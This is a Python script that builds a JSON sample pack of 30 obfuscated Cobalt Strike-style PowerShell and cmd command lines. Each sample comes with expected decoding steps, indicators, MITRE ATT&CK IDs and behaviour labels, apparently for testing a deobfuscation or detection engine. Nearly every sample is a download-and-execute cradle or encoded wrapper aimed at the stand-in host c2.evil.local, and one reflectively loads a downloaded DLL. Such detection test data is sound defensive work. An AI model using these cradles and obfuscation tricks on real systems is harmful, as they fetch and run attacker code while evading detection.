"""
Phase R1 · Cobalt Strike family sample builder.

Deterministically generates the ``families/cobalt_strike.json`` file
with all base64/UTF-16LE payloads and hex chains materialized from
Python primitives (so no hand-typed b64 strings can drift). This is the
sole source of truth for the family's ``input`` fields. Metadata
(MITRE, behaviors, IOCs) is authored inline below.

Usage
-----
    cd /app/backend && python -m workspace_recovery.phase_r.build_cobalt_strike
"""
from __future__ import annotations

import base64
import json
from pathlib import Path

FAMILIES_DIR = Path(__file__).resolve().parent / "families"
TARGET = FAMILIES_DIR / "cobalt_strike.json"


def _b64_utf16le(s: str) -> str:
    return base64.b64encode(s.encode("utf-16le")).decode("ascii")


def _hex_b64_utf16le(s: str) -> str:
    return base64.b64encode(s.encode("utf-16le")).decode("ascii").encode("ascii").hex()


CRADLE_IEX = "IEX((New-Object Net.WebClient).DownloadString('{url}'))"
CRADLE_IEX_LOWER = "iex((new-object net.webclient).downloadstring('{url}'))"


def _sample(
    sid: str,
    variant: str,
    input_str: str,
    interpreter: str | None,
    final_interpreter: str,
    decoder_chain: list[str],
    final_output_contains: list[str],
    iocs_contains: list[str],
    mitre_attack: list[str],
    behaviors: list[str],
) -> dict:
    return {
        "id": sid,
        "variant": variant,
        "input": input_str,
        "expected": {
            "interpreter": interpreter,
            "final_interpreter": final_interpreter,
            "decoder_chain": decoder_chain,
            "final_output_contains": final_output_contains,
            "iocs_contains": iocs_contains,
            "mitre_attack": mitre_attack,
            "behaviors": behaviors,
        },
    }


SAMPLES: list[dict] = [
    _sample(
        "CS001", "iex_downloadstring_classic",
        'IEX((New-Object Net.WebClient).DownloadString("http://c2.evil.local/beacon.ps1"))',
        "powershell", "powershell",
        ["alias-expand"],
        ["Invoke-Expression", "New-Object Net.WebClient", "DownloadString", "http://c2.evil.local/beacon.ps1"],
        ["http://c2.evil.local/beacon.ps1"],
        ["T1059.001", "T1105"],
        ["download_and_execute", "remote_code_execution"],
    ),
    _sample(
        "CS002", "iex_downloadstring_lowercase",
        'iex((new-object net.webclient).downloadstring("http://c2.evil.local/stage2"))',
        "powershell", "powershell",
        ["alias-expand"],
        ["Invoke-Expression", "http://c2.evil.local/stage2"],
        ["http://c2.evil.local/stage2"],
        ["T1059.001", "T1105"],
        ["download_and_execute"],
    ),
    _sample(
        "CS003", "iwr_useb_iex_pipeline",
        "iwr 'http://c2.evil.local/loader' -useb | iex",
        "powershell", "powershell",
        ["alias-expand"],
        ["Invoke-WebRequest", "http://c2.evil.local/loader", "Invoke-Expression"],
        ["http://c2.evil.local/loader"],
        ["T1059.001", "T1105"],
        ["download_and_execute"],
    ),
    _sample(
        "CS004", "string_concat_url_scheme_split",
        "$W='ht'+'tp'+'s'; $C='://'; $H='c2.evil.local/beacon.js'; iex((new-object net.webclient).downloadstring($W+$C+$H))",
        "powershell", "powershell",
        ["string-concat-fold", "variable-propagate", "alias-expand"],
        ["Invoke-Expression", "https://c2.evil.local/beacon.js"],
        ["https://c2.evil.local/beacon.js"],
        ["T1059.001", "T1105", "T1027.010"],
        ["download_and_execute", "obfuscated_command_line"],
    ),
    _sample(
        "CS005", "string_concat_two_var",
        "$scheme='http'+'s://'; $host2='c2.evil.local/x'; iex((new-object net.webclient).downloadstring($scheme+$host2))",
        "powershell", "powershell",
        ["string-concat-fold", "variable-propagate", "alias-expand"],
        ["Invoke-Expression", "https://c2.evil.local/x"],
        ["https://c2.evil.local/x"],
        ["T1059.001", "T1105", "T1027.010"],
        ["download_and_execute", "obfuscated_command_line"],
    ),
    _sample(
        "CS006", "string_concat_full_url",
        "$u='http'+'://'+'c2.evil.local/'+'stage3'; iex ((new-object net.webclient).downloadstring($u))",
        "powershell", "powershell",
        ["string-concat-fold", "variable-propagate", "alias-expand"],
        ["Invoke-Expression", "http://c2.evil.local/stage3"],
        ["http://c2.evil.local/stage3"],
        ["T1059.001", "T1105", "T1027.010"],
        ["download_and_execute", "obfuscated_command_line"],
    ),
    _sample(
        "CS007", "powershell_encodedcommand_iex_cradle",
        "powershell -EncodedCommand " + _b64_utf16le(CRADLE_IEX.format(url="http://c2.evil.local/beacon.ps1")),
        "powershell", "powershell",
        ["powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
        ["Invoke-Expression", "http://c2.evil.local/beacon.ps1"],
        ["http://c2.evil.local/beacon.ps1"],
        ["T1059.001", "T1105", "T1027", "T1140"],
        ["download_and_execute", "obfuscated_command_line"],
    ),
    _sample(
        "CS008", "powershell_enc_short_writehost",
        "powershell -enc " + _b64_utf16le('Write-Host "Cobalt Strike beacon staged"'),
        "powershell", "powershell",
        ["powershell-encoded-command", "base64", "utf-16le-decode"],
        ["Write-Host", "Cobalt Strike beacon staged"],
        [],
        ["T1059.001", "T1027"],
        ["obfuscated_command_line"],
    ),
    _sample(
        "CS009", "ps_nop_noni_wh_enc_flags",
        "powershell -NoP -NonI -W Hidden -Enc "
        + _b64_utf16le(CRADLE_IEX.format(url="http://c2.evil.local/tinybeacon")),
        "powershell", "powershell",
        ["powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
        ["Invoke-Expression", "http://c2.evil.local/tinybeacon"],
        ["http://c2.evil.local/tinybeacon"],
        ["T1059.001", "T1105", "T1027", "T1564.003"],
        ["download_and_execute", "hidden_window", "obfuscated_command_line"],
    ),
    _sample(
        "CS010", "cmd_powershell_enc_handoff",
        "cmd.exe /c powershell -enc "
        + _b64_utf16le("Write-Host 'Cobalt Strike handoff via cmd'"),
        "cmd", "powershell",
        ["powershell-encoded-command", "base64", "utf-16le-decode"],
        ["Write-Host", "Cobalt Strike handoff via cmd"],
        [],
        ["T1059.001", "T1059.003"],
        ["cmd_to_ps_handoff", "obfuscated_command_line"],
    ),
    _sample(
        "CS011", "cmd_carets_ps_enc_handoff",
        "c^m^d /c p^ow^ers^he^ll -e^nc "
        + _b64_utf16le("IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.local/x')"),
        "cmd", "powershell",
        ["cmd-caret-strip", "powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
        ["Invoke-Expression", "http://c2.evil.local/x"],
        ["http://c2.evil.local/x"],
        ["T1059.001", "T1059.003", "T1105", "T1027", "T1140"],
        ["cmd_to_ps_handoff", "download_and_execute", "obfuscated_command_line"],
    ),
    _sample(
        "CS012", "env_slice_string_join_reconstruction",
        "& ( $enV:CoMsPeC-jOiN'') ( ( [sTrInG]::JoIn( '', ( $enV:pAtH[4..6] + $EnV:pUbLiC[12] + $EnV:pRoGrAmFiLeS[9] + $enV:CoMsPeC[4,15,25] ) ) -jOiN '' ) + \" -cOmmAnD IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.local/env_reconstructed')\" )",
        "powershell", "powershell",
        ["env-substitute", "string-index-fold", "structural-fold"],
        ["c2.evil.local/env_reconstructed", "DownloadString"],
        ["http://c2.evil.local/env_reconstructed"],
        ["T1059.001", "T1105", "T1027.010"],
        ["env_var_slicing", "download_and_execute", "obfuscated_command_line"],
    ),
    _sample(
        "CS013", "iwr_https_useb_iex",
        "iwr https://c2.evil.local/loader -UseBasicParsing | iex",
        "powershell", "powershell",
        ["alias-expand"],
        ["Invoke-WebRequest", "https://c2.evil.local/loader", "Invoke-Expression"],
        ["https://c2.evil.local/loader"],
        ["T1059.001", "T1105"],
        ["download_and_execute"],
    ),
    _sample(
        "CS014", "curl_alias_useb_iex",
        "curl 'http://c2.evil.local/first' -UseBasicParsing | iex",
        "powershell", "powershell",
        ["alias-expand"],
        ["curl", "http://c2.evil.local/first", "Invoke-Expression"],
        ["http://c2.evil.local/first"],
        ["T1059.001", "T1105"],
        ["download_and_execute"],
    ),
    _sample(
        "CS015", "split_scheme_iwr_useb_iex",
        "$s='ht'+'tps://c2.evil.local/split_scheme'; iwr $s -useb | iex",
        "powershell", "powershell",
        ["string-concat-fold", "variable-propagate", "alias-expand"],
        ["Invoke-WebRequest", "https://c2.evil.local/split_scheme", "Invoke-Expression"],
        ["https://c2.evil.local/split_scheme"],
        ["T1059.001", "T1105", "T1027.010"],
        ["download_and_execute", "obfuscated_command_line"],
    ),
    _sample(
        "CS016", "hex_over_b64_over_utf16le",
        _hex_b64_utf16le(CRADLE_IEX.format(url="http://c2.evil.local/hex_chain")),
        None, "powershell",
        ["hex-decode", "base64", "utf-16le-decode", "alias-expand"],
        ["Invoke-Expression", "http://c2.evil.local/hex_chain"],
        ["http://c2.evil.local/hex_chain"],
        ["T1027", "T1105", "T1140", "T1059.001"],
        ["multi_layer_obfuscation", "download_and_execute"],
    ),
    _sample(
        "CS017", "powershell_encodedcommand_direct",
        "powershell -EncodedCommand "
        + _b64_utf16le(CRADLE_IEX.format(url="http://c2.evil.local/b64_only")),
        "powershell", "powershell",
        ["powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
        ["Invoke-Expression", "http://c2.evil.local/b64_only"],
        ["http://c2.evil.local/b64_only"],
        ["T1059.001", "T1027", "T1105", "T1140"],
        ["obfuscated_command_line", "download_and_execute"],
    ),
    _sample(
        "CS018", "backtick_alias_noise_iwr_iex",
        "i`wr https://c2.evil.local/backtick_beacon -useb | i`ex",
        "powershell", "powershell",
        ["backtick-strip", "alias-expand"],
        ["Invoke-WebRequest", "https://c2.evil.local/backtick_beacon", "Invoke-Expression"],
        ["https://c2.evil.local/backtick_beacon"],
        ["T1059.001", "T1105", "T1027.010"],
        ["backtick_obfuscation", "download_and_execute"],
    ),
    _sample(
        "CS019", "sq_var_propagate_iex",
        "$u='http://c2.evil.local/final'; iex ((new-object net.webclient).downloadstring($u))",
        "powershell", "powershell",
        ["variable-propagate", "alias-expand"],
        ["Invoke-Expression", "http://c2.evil.local/final"],
        ["http://c2.evil.local/final"],
        ["T1059.001", "T1105"],
        ["download_and_execute"],
    ),
    _sample(
        "CS020", "three_var_concat_chain",
        "$A='ht'; $B='tp://'; $C='c2.evil.local/three'; iex ((new-object net.webclient).downloadstring($A+$B+$C))",
        "powershell", "powershell",
        ["variable-propagate", "string-concat-fold", "alias-expand"],
        ["Invoke-Expression", "http://c2.evil.local/three"],
        ["http://c2.evil.local/three"],
        ["T1059.001", "T1105", "T1027.010"],
        ["download_and_execute", "obfuscated_command_line"],
    ),
    _sample(
        "CS021", "cmd_caret_ps_enc_emotet_style_cs",
        "c^m^d /c p^ow^ers^he^ll -e^n^c "
        + _b64_utf16le(CRADLE_IEX.format(url="http://c2.evil.local/emotet_style_cs")),
        "cmd", "powershell",
        ["cmd-caret-strip", "powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
        ["Invoke-Expression", "http://c2.evil.local/emotet_style_cs"],
        ["http://c2.evil.local/emotet_style_cs"],
        ["T1059.001", "T1059.003", "T1105", "T1027", "T1140"],
        ["cmd_to_ps_handoff", "download_and_execute", "obfuscated_command_line"],
    ),
    _sample(
        "CS022", "powershell_encodedcommand_writehost_phase_r1",
        "powershell -EncodedCommand " + _b64_utf16le('Write-Host "CS beacon phase R1"'),
        "powershell", "powershell",
        ["powershell-encoded-command", "base64", "utf-16le-decode"],
        ["Write-Host", "CS beacon phase R1"],
        [],
        ["T1059.001", "T1027"],
        ["obfuscated_command_line"],
    ),
    _sample(
        "CS023", "ps_encodedcommand_ie_alias",
        "powershell -Enc "
        + _b64_utf16le('IEX ((New-Object Net.WebClient).DownloadString("http://c2.evil.local/ie_alias"))'),
        "powershell", "powershell",
        ["powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
        ["Invoke-Expression", "http://c2.evil.local/ie_alias"],
        ["http://c2.evil.local/ie_alias"],
        ["T1059.001", "T1105", "T1027", "T1140"],
        ["download_and_execute", "obfuscated_command_line"],
    ),
    _sample(
        "CS024", "cmd_caret_over_ps_enc_iex",
        "c^m^d /c p^ow^ers^he^ll -Enc "
        + _b64_utf16le('IEX((New-Object Net.WebClient).DownloadString("http://c2.evil.local/nested_cs"))'),
        "cmd", "powershell",
        ["cmd-caret-strip", "powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
        ["Invoke-Expression", "http://c2.evil.local/nested_cs"],
        ["http://c2.evil.local/nested_cs"],
        ["T1059.001", "T1059.003", "T1105", "T1027", "T1140"],
        ["cmd_to_ps_handoff", "download_and_execute", "obfuscated_command_line"],
    ),
    _sample(
        "CS025", "backtick_iwr_useb_iex_sq",
        "i`w`r 'http://c2.evil.local/backticked_url' -useb | iex",
        "powershell", "powershell",
        ["backtick-strip", "alias-expand"],
        ["Invoke-WebRequest", "http://c2.evil.local/backticked_url", "Invoke-Expression"],
        ["http://c2.evil.local/backticked_url"],
        ["T1059.001", "T1105", "T1027.010"],
        ["backtick_obfuscation", "download_and_execute"],
    ),
    _sample(
        "CS026", "random_case_iex_downloadstring",
        "iEx ((nEw-oBjecT nEt.WebClIent).DoWnLoAdStrIng('http://c2.evil.local/casey'))",
        "powershell", "powershell",
        ["alias-expand"],
        ["Invoke-Expression", "http://c2.evil.local/casey"],
        ["http://c2.evil.local/casey"],
        ["T1059.001", "T1105", "T1027.010"],
        ["case_obfuscation", "download_and_execute"],
    ),
    _sample(
        "CS027", "ps_encodedcommand_getprocess_discovery",
        "powershell -EncodedCommand " + _b64_utf16le("Get-Process | Select Name,Id"),
        "powershell", "powershell",
        ["powershell-encoded-command", "base64", "utf-16le-decode"],
        ["Get-Process", "Select", "Name", "Id"],
        [],
        ["T1057", "T1059.001", "T1027"],
        ["process_discovery", "obfuscated_command_line"],
    ),
    _sample(
        "CS028", "ps_encodedcommand_reflective_assembly_load_stub",
        "powershell -Enc " + _b64_utf16le(
            "$b=(New-Object Net.WebClient).DownloadData('http://c2.evil.local/dll'); [Reflection.Assembly]::Load($b)"
        ),
        "powershell", "powershell",
        ["powershell-encoded-command", "base64", "utf-16le-decode"],
        ["DownloadData", "http://c2.evil.local/dll", "Reflection.Assembly", "Load"],
        ["http://c2.evil.local/dll"],
        ["T1059.001", "T1027", "T1105", "T1620"],
        ["reflective_load", "download_and_execute", "obfuscated_command_line"],
    ),
    _sample(
        "CS029", "iwr_iex_backtick_on_iex",
        "iwr https://c2.evil.local/cs29 -useb | i`e`x",
        "powershell", "powershell",
        ["backtick-strip", "alias-expand"],
        ["Invoke-WebRequest", "https://c2.evil.local/cs29", "Invoke-Expression"],
        ["https://c2.evil.local/cs29"],
        ["T1059.001", "T1105", "T1027.010"],
        ["backtick_obfuscation", "download_and_execute"],
    ),
    _sample(
        "CS030", "iex_downloadstring_https_loader_ps1",
        "IEX ((New-Object Net.WebClient).DownloadString('https://c2.evil.local/cs30/loader.ps1'))",
        "powershell", "powershell",
        ["alias-expand"],
        ["Invoke-Expression", "https://c2.evil.local/cs30/loader.ps1"],
        ["https://c2.evil.local/cs30/loader.ps1"],
        ["T1059.001", "T1105"],
        ["download_and_execute"],
    ),
]


def build() -> dict:
    return {
        "family_id": "cobalt_strike",
        "family_display_name": "Cobalt Strike",
        "family_version": "r1-1.0.0",
        "description": (
            "Cobalt Strike (Empire / Nishang / Invoke-CradleCrafter lineage) beacon "
            "staging, download cradles, base64-EncodedCommand wrappers, CMD\u2192PowerShell "
            "handoff patterns, and layered obfuscation variants. Curated deterministic "
            "Phase R1 pack."
        ),
        "primary_mitre_attack": ["T1059.001", "T1105", "T1027.010", "T1140"],
        "primary_behaviors": [
            "download_and_execute",
            "remote_code_execution",
            "obfuscated_command_line",
            "beacon_staging",
        ],
        "obfuscation_variants_covered": sorted({s["variant"] for s in SAMPLES}),
        "samples": SAMPLES,
    }


def main() -> int:
    FAMILIES_DIR.mkdir(parents=True, exist_ok=True)
    payload = build()
    TARGET.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
    print(f"Wrote {len(SAMPLES)} Cobalt Strike samples to {TARGET}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
